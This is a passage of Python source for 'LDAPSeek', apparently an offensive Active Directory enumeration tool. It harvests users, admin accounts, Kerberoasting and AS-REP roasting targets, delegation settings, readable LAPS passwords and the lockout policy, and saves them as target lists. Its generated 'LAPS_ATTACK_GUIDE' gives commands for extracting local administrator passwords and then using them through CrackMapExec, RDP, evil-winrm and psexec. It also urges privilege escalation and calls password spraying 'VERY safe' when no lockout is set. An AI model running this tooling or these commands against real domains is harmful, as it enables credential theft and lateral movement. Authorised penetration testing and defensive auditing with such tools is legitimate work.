    return delegation_accounts


def identify_admin_users(users, groups):
    """Identify administrative users"""
    admin_users = []
    
    # Users with adminCount=1
    for user in users:
        if user.get('admin_count') == 1:
            admin_users.append({
                'username': user.get('username', 'Unknown'),
                'reason': 'adminCount=1',
                'groups': user.get('groups', [])
            })
            continue
        
        # Users in privileged groups
        if 'groups' in user:
            for group_dn in user['groups']:
                group_cn = group_dn.split(',')[0].replace('CN=', '')
                if group_cn in PRIVILEGED_GROUPS:
                    admin_users.append({
                        'username': user.get('username', 'Unknown'),
                        'reason': f'Member of {group_cn}',
                        'groups': user.get('groups', [])
                    })
                    break
    
    return admin_users


def enumerate_password_policy_ldapsearch(dc_ip, base_dn, username=None, password=None, timeout=30):
    """
    Enumerate domain password policy.
    Queries default domain policy for password settings.
    
    Returns: dict with policy settings
    """
    policy = {
        'min_password_length': None,
        'password_history_length': None,
        'max_password_age': None,
        'min_password_age': None,
        'lockout_threshold': None,
        'lockout_duration': None,
        'lockout_observation_window': None,
        'password_complexity': None,
        'error': None
    }
    
    try:
        # Query the default domain password policy
        # It's stored in the domain root object
        ldap_filter = '(objectClass=domain)'
        attrs = ['minPwdLength', 'pwdHistoryLength', 'maxPwdAge', 'minPwdAge',
                'lockoutThreshold', 'lockoutDuration', 'lockOutObservationWindow',
                'pwdProperties']
        
        if username and password:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-D', username, '-w', password,
                   '-b', base_dn, '-s', 'base', ldap_filter] + attrs
        else:
            cmd = ['ldapsearch', '-x', '-H', f'ldap://{dc_ip}',
                   '-b', base_dn, '-s', 'base', ldap_filter] + attrs
        
        proc = subprocess.run(cmd, capture_output=True, text=True, timeout=timeout)
        
        if proc.returncode == 0:
            for line in proc.stdout.split('\n'):
                line = line.strip()
                
                if ': ' in line:
                    key, value = line.split(':', 1)
                    value = value.strip()
                    
                    if key == 'minPwdLength':
                        policy['min_password_length'] = int(value)
                    elif key == 'pwdHistoryLength':
                        policy['password_history_length'] = int(value)
                    elif key == 'maxPwdAge':
                        # Convert from 100-nanosecond intervals (negative value)
                        try:
                            # MaxPwdAge is stored as negative 100-nanosecond intervals
                            age_ns = abs(int(value))
                            days = age_ns / (10000000 * 60 * 60 * 24)
                            policy['max_password_age'] = f"{int(days)} days"
                        except:
                            policy['max_password_age'] = value
                    elif key == 'minPwdAge':
                        try:
                            age_ns = abs(int(value))
                            days = age_ns / (10000000 * 60 * 60 * 24)
                            policy['min_password_age'] = f"{int(days)} days"
                        except:
                            policy['min_password_age'] = value
                    elif key == 'lockoutThreshold':
                        policy['lockout_threshold'] = int(value)
                    elif key == 'lockoutDuration':
                        try:
                            # Stored as negative 100-nanosecond intervals
                            duration_ns = abs(int(value))
                            minutes = duration_ns / (10000000 * 60)
                            policy['lockout_duration'] = f"{int(minutes)} minutes"
                        except:
                            policy['lockout_duration'] = value
                    elif key == 'lockOutObservationWindow':
                        try:
                            window_ns = abs(int(value))
                            minutes = window_ns / (10000000 * 60)
                            policy['lockout_observation_window'] = f"{int(minutes)} minutes"
                        except:
                            policy['lockout_observation_window'] = value
                    elif key == 'pwdProperties':
                        # Decode password complexity flags
                        props = int(value)
                        complexity_enabled = bool(props & 0x1)  # DOMAIN_PASSWORD_COMPLEX
                        policy['password_complexity'] = 'Enabled' if complexity_enabled else 'Disabled'
    
    except subprocess.TimeoutExpired:
        policy['error'] = 'Timeout'
    except FileNotFoundError:
        policy['error'] = 'ldapsearch not found'
    except Exception as e:
        policy['error'] = str(e)
    
    return policy


def scan_domain_controller(dc_ip, args):
    """
    Scan a single domain controller
    Returns: dict with findings
    """
    result = {
        'dc_ip': dc_ip,
        'domain': None,
        'ldap_accessible': False,
        'anonymous_bind': False,
        'users': [],
        'groups': [],
        'computers': [],
        'spn_users': [],
        'asrep_users': [],
        'delegation_accounts': [],
        'delegation_data': {'unconstrained': [], 'constrained': [], 'rbcd': []},
        'admin_users': [],
        'laps_data': {'laps_enabled': [], 'readable_laps': []},
        'password_policy': {},
        'status': 'unreachable'
    }
    
    try:
        # Check LDAP port
        if not check_ldap_port(dc_ip, timeout=args.timeout):
            return result
        
        result['ldap_accessible'] = True
        result['status'] = 'accessible'
        
        # Get domain info
        domain_info = get_domain_info_ldapsearch(dc_ip, args.username, args.password, timeout=args.timeout)
        
        if domain_info['domain']:
            result['domain'] = domain_info['domain']
            result['naming_context'] = domain_info['naming_context']
            
            if not args.username:
                result['anonymous_bind'] = True
            
            # Enumerate users
            if args.full or args.spns or args.asrep or not (args.spns or args.asrep):
                users = enumerate_users_ldapsearch(dc_ip, domain_info['naming_context'], 
                                                   args.username, args.password, timeout=args.timeout*2)
                result['users'] = users
                
                # Identify Kerberoastable users
                result['spn_users'] = identify_kerberoastable_users(users)
                
                # Identify ASREPRoastable users
                result['asrep_users'] = identify_asrep_users(users)
                
                # Identify admin users
                result['admin_users'] = identify_admin_users(users, [])
            
            # Enumerate groups
            if args.full:
                groups = enumerate_groups_ldapsearch(dc_ip, domain_info['naming_context'],
                                                    args.username, args.password, timeout=args.timeout*2)
                result['groups'] = groups
                
                # Re-identify admin users with group info
                result['admin_users'] = identify_admin_users(result['users'], groups)
            
            # Enumerate computers
            if args.full:
                computers = enumerate_computers_ldapsearch(dc_ip, domain_info['naming_context'],
                                                          args.username, args.password, timeout=args.timeout*2)
                result['computers'] = computers
                
                # Identify delegation accounts (legacy)
                result['delegation_accounts'] = identify_delegation_accounts(result['users'], computers)
                
                # Enhanced delegation enumeration (unconstrained/constrained/RBCD)
                if args.username:
                    delegation_data = enumerate_delegation_ldapsearch(dc_ip, domain_info['naming_context'],
                                                                      args.username, args.password, timeout=args.timeout*2)
                    result['delegation_data'] = delegation_data
                
                # Enumerate LAPS (requires authentication usually)
                if args.username:
                    laps_data = enumerate_laps_ldapsearch(dc_ip, domain_info['naming_context'],
                                                          args.username, args.password, timeout=args.timeout*2)
                    result['laps_data'] = laps_data
                
                # Enumerate password policy
                password_policy = enumerate_password_policy_ldapsearch(dc_ip, domain_info['naming_context'],
                                                                       args.username, args.password, timeout=args.timeout)
                result['password_policy'] = password_policy
            
            result['status'] = 'enumerated'
    
    except KeyboardInterrupt:
        raise
    except Exception as e:
        result['error'] = str(e)
    
    return result


def save_ldaplist(results, filename='ldaplist.txt'):
    """Save list of domain controllers"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                if result['ldap_accessible']:
                    f.write(f"{result['dc_ip']}\n")
        print(f"{GREEN}[+] DC list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving DC list: {e}{RESET}")


def save_usernames(results, filename='users.txt'):
    """Save list of usernames"""
    try:
        with open(filename, 'w') as f:
            for result in results:
                for user in result['users']:
                    if 'username' in user:
                        f.write(f"{user['username']}\n")
        print(f"{GREEN}[+] Username list saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving usernames: {e}{RESET}")


def save_spn_users(results, filename='spns.txt'):
    """Save list of SPN users (Kerberoasting targets)"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LDAPSEEK - Kerberoastable Accounts (SPNs)\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['spn_users']:
                    f.write(f"\nDomain: {result.get('domain', 'Unknown')}\n")
                    f.write(f"DC: {result['dc_ip']}\n")
                    f.write(f"{'=' * 80}\n\n")
                    
                    for user in result['spn_users']:
                        f.write(f"Username: {user.get('username', 'Unknown')}\n")
                        if 'upn' in user:
                            f.write(f"UPN: {user['upn']}\n")
                        f.write(f"SPNs:\n")
                        for spn in user.get('spns', []):
                            f.write(f"  • {spn}\n")
                        f.write("\n")
        
        print(f"{GREEN}[+] SPN users saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving SPN users: {e}{RESET}")


def save_asrep_users(results, filename='asrep_users.txt'):
    """Save list of ASREPRoast candidates"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LDAPSEEK - ASREPRoastable Accounts\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            f.write("These accounts do not require Kerberos pre-authentication.\n")
            f.write("Use GetNPUsers.py or Rubeus to request AS-REP hashes.\n\n")
            
            for result in results:
                if result['asrep_users']:
                    f.write(f"\nDomain: {result.get('domain', 'Unknown')}\n")
                    f.write(f"DC: {result['dc_ip']}\n")
                    f.write(f"{'=' * 80}\n\n")
                    
                    for user in result['asrep_users']:
                        f.write(f"• {user.get('username', 'Unknown')}\n")
        
        print(f"{GREEN}[+] ASREPRoast candidates saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving ASREPRoast users: {e}{RESET}")


def save_admin_users(results, filename='admin_users.txt'):
    """Save list of administrative users"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LDAPSEEK - Administrative Accounts\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['admin_users']:
                    f.write(f"\nDomain: {result.get('domain', 'Unknown')}\n")
                    f.write(f"DC: {result['dc_ip']}\n")
                    f.write(f"{'=' * 80}\n\n")
                    
                    for admin in result['admin_users']:
                        f.write(f"Username: {admin['username']}\n")
                        f.write(f"Reason: {admin['reason']}\n\n")
        
        print(f"{GREEN}[+] Admin users saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving admin users: {e}{RESET}")


def save_details(results, filename='ldap_details.txt'):
    """Save detailed scan results"""
    try:
        with open(filename, 'w') as f:
            f.write("=" * 80 + "\n")
            f.write("LDAPSEEK - Detailed LDAP Enumeration Results\n")
            f.write(f"Scan Date: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 80 + "\n\n")
            
            for result in results:
                if result['status'] in ['accessible', 'enumerated']:
                    f.write(f"\n{'=' * 80}\n")
                    f.write(f"Domain Controller: {result['dc_ip']}\n")
                    if result.get('domain'):
                        f.write(f"Domain: {result['domain']}\n")
                    f.write(f"Anonymous Bind: {'Yes' if result['anonymous_bind'] else 'No'}\n")
                    f.write(f"{'=' * 80}\n\n")
                    
                    if result['users']:
                        f.write(f"Users Found: {len(result['users'])}\n")
                    
                    if result['spn_users']:
                        f.write(f"\n🎯 Kerberoastable Accounts: {len(result['spn_users'])}\n")
                        for user in result['spn_users'][:10]:  # Limit output
                            f.write(f"  • {user.get('username', 'Unknown')}\n")
                    
                    if result['asrep_users']:
                        f.write(f"\n🎯 ASREPRoastable Accounts: {len(result['asrep_users'])}\n")
                        for user in result['asrep_users']:
                            f.write(f"  • {user.get('username', 'Unknown')}\n")
                    
                    if result['delegation_accounts']:
                        f.write(f"\n⚠ Delegation Accounts: {len(result['delegation_accounts'])}\n")
                        for account in result['delegation_accounts']:
                            f.write(f"  • {account['name']} ({account['type']}) - {account['delegation_type']}\n")
                    
                    if result['admin_users']:
                        f.write(f"\n👑 Administrative Users: {len(result['admin_users'])}\n")
                        for admin in result['admin_users'][:10]:
                            f.write(f"  • {admin['username']} - {admin['reason']}\n")
                    
                    f.write("\n")
        
        print(f"{GREEN}[+] Detailed results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving details: {e}{RESET}")


def save_json(results, filename='ldap_details.json'):
    """Save results as JSON"""
    try:
        # Remove non-serializable data
        clean_results = []
        for result in results:
            clean_result = {k: v for k, v in result.items() if k != 'error'}
            clean_results.append(clean_result)
        
        with open(filename, 'w') as f:
            json.dump(clean_results, f, indent=2)
        print(f"{GREEN}[+] JSON results saved to: {filename}{RESET}")
    except Exception as e:
        print(f"{RED}[!] Error saving JSON: {e}{RESET}")


def save_laps_readable(laps_data, filename='laps_readable.txt'):
    """Save list of computers with readable LAPS passwords"""
    try:
        readable = laps_data.get('readable_laps', [])
        
        if not readable:
            return 0
        
        with open(filename, 'w') as f:
            for computer in readable:
                # Don't save the actual password - just the computer name
                name = computer.get('name', computer.get('hostname', 'Unknown'))
                f.write(f"{name}\n")
        
        print(f"{GREEN}[+] LAPS readable computers saved to: {filename}{RESET}")
        return len(readable)
    except Exception as e:
        print(f"{RED}[!] Error saving LAPS readable list: {e}{RESET}")
        return 0


def save_laps_attack_guide(laps_data, filename='LAPS_ATTACK_GUIDE.txt'):
    """Generate LAPS extraction guide"""
    try:
        readable = laps_data.get('readable_laps', [])
        enabled = laps_data.get('laps_enabled', [])
        
        if not readable and not enabled:
            return
        
        with open(filename, 'w') as f:
            f.write("=" * 70 + "\n")
            f.write("LAPS (Local Administrator Password Solution) FINDINGS\n")
            f.write("=" * 70 + "\n\n")
            
            f.write(f"LAPS Enabled Computers: {len(enabled)}\n")
            f.write(f"LAPS Passwords Readable: {len(readable)}\n\n")
            
            if readable:
                f.write("=" * 70 + "\n")
                f.write("⚠ READABLE LAPS PASSWORDS FOUND ⚠\n")
                f.write("=" * 70 + "\n\n")
                f.write("The following computers have LAPS passwords that are readable\n")
                f.write("by your current user account:\n\n")
                
                for computer in readable:
                    name = computer.get('name', 'Unknown')
                    hostname = computer.get('hostname', 'N/A')
                    expiration = computer.get('laps_expiration', 'Unknown')
                    
                    f.write(f"Computer: {name}\n")
                    if hostname != 'N/A':
                        f.write(f"Hostname: {hostname}\n")
                    f.write(f"Password Expiration: {expiration}\n")
                    f.write(f"Note: Password NOT included in this file for security\n")
                    f.write("\n")
                
                f.write("=" * 70 + "\n")
                f.write("MANUAL EXTRACTION COMMANDS\n")
                f.write("=" * 70 + "\n\n")
                
                f.write("Method 1: PowerShell (from domain-joined Windows machine)\n")
                f.write("-" * 70 + "\n")
                for computer in readable[:3]:  # Show examples for first 3
                    name = computer.get('name', 'Unknown')
                    f.write(f"Get-ADComputer {name} -Properties ms-Mcs-AdmPwd | Select-Object Name,ms-Mcs-AdmPwd\n")
                if len(readable) > 3:
                    f.write(f"... ({len(readable) - 3} more computers)\n")
                f.write("\n")
                
                f.write("Method 2: Python with ldap3\n")
                f.write("-" * 70 + "\n")
                f.write("from ldap3 import Server, Connection, ALL\n")
                f.write("server = Server('DC_IP', get_info=ALL)\n")
                f.write("conn = Connection(server, user='DOMAIN\\\\user', password='pass')\n")
                f.write("conn.bind()\n")
                for computer in readable[:3]:
                    name = computer.get('name', 'Unknown')
                    f.write(f"conn.search('DC=domain,DC=local', '(sAMAccountName={name}$)', attributes=['ms-Mcs-AdmPwd'])\n")
                    f.write(f"print(conn.entries[0]['ms-Mcs-AdmPwd'])\n")
                f.write("\n")
                
                f.write("Method 3: ldapsearch (Linux)\n")
                f.write("-" * 70 + "\n")
                for computer in readable[:3]:
                    name = computer.get('name', 'Unknown')
                    f.write(f"ldapsearch -x -H ldap://DC_IP -D 'user@domain.local' -w 'password' \\\n")
                    f.write(f"  -b 'DC=domain,DC=local' '(sAMAccountName={name}$)' ms-Mcs-AdmPwd\n\n")
                f.write("\n")
                
                f.write("Method 4: CrackMapExec\n")
                f.write("-" * 70 + "\n")
                f.write("crackmapexec ldap DC_IP -u user -p password --laps\n\n")
                
            if enabled and not readable:
                f.write("=" * 70 + "\n")
                f.write("LAPS ENABLED (But Not Readable)\n")
                f.write("=" * 70 + "\n\n")
                f.write(f"Found {len(enabled)} computers with LAPS enabled, but you don't\n")
                f.write("have permission to read the passwords with your current account.\n\n")
                f.write("Try:\n")
                f.write("- Escalate privileges to Domain Admin or equivalent\n")
                f.write("- Compromise an account in 'LAPS Password Readers' group\n")
                f.write("- Check for ACL misconfigurations on computer objects\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("POST-EXTRACTION USAGE\n")
            f.write("=" * 70 + "\n\n")
            f.write("Once you extract LAPS passwords, use them for:\n\n")
            f.write("1. Local Administrator Access:\n")
            f.write("   crackmapexec smb COMPUTER_IP -u Administrator -p 'LAPS_PASSWORD'\n\n")
            f.write("2. RDP Access:\n")
            f.write("   xfreerdp /u:Administrator /p:'LAPS_PASSWORD' /v:COMPUTER_IP\n\n")
            f.write("3. WinRM Access:\n")
            f.write("   evil-winrm -i COMPUTER_IP -u Administrator -p 'LAPS_PASSWORD'\n\n")
            f.write("4. PSExec:\n")
            f.write("   impacket-psexec Administrator:'LAPS_PASSWORD'@COMPUTER_IP\n\n")
            
            f.write("=" * 70 + "\n")
            f.write("REFERENCES\n")
            f.write("=" * 70 + "\n\n")
            f.write("• https://learn.microsoft.com/en-us/windows-server/identity/laps/laps-overview\n")
            f.write("• https://github.com/n00py/LAPSDumper\n")
            f.write("• https://www.hackingarticles.in/credential-dumpinglaps/\n\n")
        
        print(f"{GREEN}[+] LAPS attack guide saved to: {filename}{RESET}")
        
    except Exception as e:
        print(f"{RED}[!] Error saving LAPS attack guide: {e}{RESET}")


def main():
    parser = argparse.ArgumentParser(
        description='LDAPSeek - Active Directory LDAP Enumeration',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
Examples:
  ./ldapseek.py dclist.txt                        # Quick enumeration (anonymous)
  ./ldapseek.py dclist.txt --full                 # Full enumeration
  ./ldapseek.py dclist.txt --spns                 # Kerberoasting targets only
  ./ldapseek.py dclist.txt --asrep                # ASREPRoast targets only
  ./ldapseek.py dclist.txt -u user@domain -p pass # Authenticated scan
        """
    )
    
    parser.add_argument('input_file', help='File containing DC IP addresses')
    parser.add_argument('--full', action='store_true', help='Full enumeration (groups, computers, delegation)')
    parser.add_argument('--spns', action='store_true', help='Only enumerate SPN users (Kerberoasting)')
    parser.add_argument('--asrep', action='store_true', help='Only enumerate ASREPRoast candidates')
    parser.add_argument('-u', '--username', help='Username for authenticated LDAP bind (user@domain or DOMAIN\\user)')
    parser.add_argument('-p', '--password', help='Password for authenticated LDAP bind')
    parser.add_argument('-t', '--timeout', type=int, default=5, help='Connection timeout (default: 5)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    
    args = parser.parse_args()
    
    print_banner()
    
    # Read DC IPs
    dc_ips = read_ip_list(args.input_file)
    
    if not dc_ips:
        print(f"{RED}[!] No DCs to scan{RESET}")
        sys.exit(1)
    
    print(f"{CYAN}[*] Starting LDAP enumeration...{RESET}")
    print(f"{CYAN}[*] Domain Controllers: {len(dc_ips)}{RESET}")
    print(f"{CYAN}[*] Authentication: {'Yes' if args.username else 'Anonymous'}{RESET}")
    print(f"{CYAN}[*] Mode: {'Full' if args.full else 'SPNs only' if args.spns else 'ASREPRoast only' if args.asrep else 'Quick'}{RESET}")
    print()
    
    results = []
    
    try:
        for dc_ip in dc_ips:
            try:
                print(f"{BLUE}[*]{RESET} Enumerating {dc_ip}...")
                result = scan_domain_controller(dc_ip, args)
                results.append(result)
                
                if result['status'] == 'enumerated':
                    print(f"{GREEN}[+]{RESET} {dc_ip} - Domain: {result.get('domain', 'Unknown')}")
                    
                    if result['anonymous_bind']:
                        print(f"  {YELLOW}⚠{RESET}  Anonymous LDAP bind allowed!")
                    
                    if result['users']:
                        print(f"  └─ Users: {len(result['users'])}")
                    
                    if result['spn_users']:
                        print(f"  └─ {RED}Kerberoastable:{RESET} {len(result['spn_users'])}")
                    
                    if result['asrep_users']:
                        print(f"  └─ {RED}ASREPRoastable:{RESET} {len(result['asrep_users'])}")
                    
                    if result['delegation_accounts']:
                        print(f"  └─ {YELLOW}Delegation accounts:{RESET} {len(result['delegation_accounts'])}")
                    
                    # Enhanced delegation findings
                    delegation_data = result.get('delegation_data', {})
                    if delegation_data.get('unconstrained'):
                        print(f"  └─ {RED}Unconstrained Delegation:{RESET} {len(delegation_data['unconstrained'])}")
                    if delegation_data.get('constrained'):
                        print(f"  └─ {YELLOW}Constrained Delegation:{RESET} {len(delegation_data['constrained'])}")
                    if delegation_data.get('rbcd'):
                        print(f"  └─ {YELLOW}RBCD:{RESET} {len(delegation_data['rbcd'])}")
                    
                    if result['admin_users']:
                        print(f"  └─ Admin users: {len(result['admin_users'])}")
                    
                    # LAPS findings
                    laps_data = result.get('laps_data', {})
                    if laps_data.get('readable_laps'):
                        print(f"  └─ {RED}LAPS Readable:{RESET} {len(laps_data['readable_laps'])} computers!")
                    
                    # Password policy
                    policy = result.get('password_policy', {})
                    if policy and not policy.get('error'):
                        min_len = policy.get('min_password_length', 'N/A')
                        complexity = policy.get('password_complexity', 'N/A')
                        lockout = policy.get('lockout_threshold', 'N/A')
                        
                        # Color code weak settings
                        if min_len != 'N/A' and isinstance(min_len, int) and min_len < 8:
                            min_len_str = f"{RED}{min_len}{RESET}"
                        else:
                            min_len_str = str(min_len)
                        
                        if complexity == 'Disabled':
                            complexity_str = f"{YELLOW}{complexity}{RESET}"
                        else:
                            complexity_str = complexity
                        
                        if lockout == 'N/A' or (isinstance(lockout, int) and lockout == 0):
                            lockout_str = f"{RED}No lockout{RESET}"
                        else:
                            lockout_str = str(lockout)
                        
                        print(f"  └─ Password Policy: MinLen={min_len_str}, Complexity={complexity_str}, Lockout={lockout_str}")
                
                elif result['status'] == 'accessible':
                    print(f"{YELLOW}[~]{RESET} {dc_ip} - LDAP accessible but enumeration failed")
                else:
                    if args.verbose:
                        print(f"{RED}[!]{RESET} {dc_ip} - Unreachable")
                
            except KeyboardInterrupt:
                print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
                break
            except Exception as e:
                if args.verbose:
                    print(f"{RED}[!]{RESET} {dc_ip} - Error: {e}")
    
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Scan interrupted by user{RESET}")
    
    # Print summary
    print(f"\n{CYAN}{'=' * 80}{RESET}")
    print(f"{CYAN}Enumeration Complete{RESET}")
    print(f"{CYAN}{'=' * 80}{RESET}")
    
    accessible_dcs = len([r for r in results if r['ldap_accessible']])
    total_users = sum(len(r['users']) for r in results)
    total_spns = sum(len(r['spn_users']) for r in results)
    total_asrep = sum(len(r['asrep_users']) for r in results)
    total_admins = sum(len(r['admin_users']) for r in results)
    
    # Aggregate LAPS data
    total_laps_readable = 0
    total_laps_enabled = 0
    combined_laps_data = {'laps_enabled': [], 'readable_laps': []}
    for r in results:
        laps_data = r.get('laps_data', {})
        total_laps_readable += len(laps_data.get('readable_laps', []))
        total_laps_enabled += len(laps_data.get('laps_enabled', []))
        combined_laps_data['readable_laps'].extend(laps_data.get('readable_laps', []))
        combined_laps_data['laps_enabled'].extend(laps_data.get('laps_enabled', []))
    
    # Aggregate delegation data
    combined_delegation_data = {'unconstrained': [], 'constrained': [], 'rbcd': []}
    total_unconstrained = 0
    total_constrained = 0
    total_rbcd = 0
    for r in results:
        delegation_data = r.get('delegation_data', {})
        total_unconstrained += len(delegation_data.get('unconstrained', []))
        total_constrained += len(delegation_data.get('constrained', []))
        total_rbcd += len(delegation_data.get('rbcd', []))
        combined_delegation_data['unconstrained'].extend(delegation_data.get('unconstrained', []))
        combined_delegation_data['constrained'].extend(delegation_data.get('constrained', []))
        combined_delegation_data['rbcd'].extend(delegation_data.get('rbcd', []))
    
    print(f"Accessible DCs: {accessible_dcs}/{len(dc_ips)}")
    print(f"Total users: {total_users}")
    print(f"Kerberoastable accounts: {total_spns}")
    print(f"ASREPRoastable accounts: {total_asrep}")
    print(f"Admin accounts: {total_admins}")
    
    if total_unconstrained > 0:
        print(f"{RED}Unconstrained Delegation: {total_unconstrained} ⚠{RESET}")
    if total_constrained > 0:
        print(f"{YELLOW}Constrained Delegation: {total_constrained}{RESET}")
    if total_rbcd > 0:
        print(f"{YELLOW}RBCD: {total_rbcd}{RESET}")
    
    if total_laps_readable > 0:
        print(f"{RED}LAPS Readable: {total_laps_readable} computers ⚠{RESET}")
    
    # Save results
    if results:
        save_ldaplist(results)
        if total_users > 0:
            save_usernames(results)
        if total_spns > 0:
            save_spn_users(results)
        if total_asrep > 0:
            save_asrep_users(results)
        if total_admins > 0:
            save_admin_users(results)
        
        # Save delegation results
        if total_unconstrained > 0 or total_constrained > 0 or total_rbcd > 0:
            deleg_count = save_delegation_targets(combined_delegation_data)
            if deleg_count > 0:
                save_delegation_attack_guide(combined_delegation_data)
                if total_unconstrained > 0:
                    print(f"\n{RED}[!] CRITICAL: {total_unconstrained} accounts with UNCONSTRAINED delegation!{RESET}")
                    print(f"{YELLOW}[!] Review DELEGATION_ATTACK_GUIDE.txt for exploitation{RESET}")
        
        # Save LAPS results
        if total_laps_readable > 0 or total_laps_enabled > 0:
            laps_count = save_laps_readable(combined_laps_data)
            if laps_count > 0:
                save_laps_attack_guide(combined_laps_data)
                print(f"\n{YELLOW}[!] CRITICAL: {laps_count} computers have readable LAPS passwords!{RESET}")
                print(f"{YELLOW}[!] Review LAPS_ATTACK_GUIDE.txt for extraction commands{RESET}")
        
        # Save password policy
        # Aggregate policy from all DCs (should be the same across domain)
        password_policies = [r.get('password_policy', {}) for r in results if r.get('password_policy') and not r['password_policy'].get('error')]
        if password_policies:
            # Use first valid policy (they should all be the same)
            primary_policy = password_policies[0]
            save_password_policy(primary_policy)
            
            # Generate users attack guide
            if total_users > 0:
                save_users_attack_guide(primary_policy, total_users)
                
                # Warn about weak policy
                lockout = primary_policy.get('lockout_threshold', 'Unknown')
                if lockout == 'Unknown' or (isinstance(lockout, int) and lockout == 0):
                    print(f"\n{RED}[!] WARNING: No account lockout policy detected!{RESET}")
                    print(f"{YELLOW}[!] Password spraying is VERY safe - see USERS_ATTACK_GUIDE.txt{RESET}")
                elif isinstance(lockout, int) and lockout > 0:
                    print(f"\n{YELLOW}[!] Account lockout: {lockout} attempts{RESET}")
                    print(f"{YELLOW}[!] Review USERS_ATTACK_GUIDE.txt for safe password spray methodology{RESET}")
        
        save_details(results)
        save_json(results)
    
    print(f"\n{GREEN}[+] Enumeration complete!{RESET}")


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{YELLOW}[!] Interrupted by user{RESET}")
        sys.exit(0)
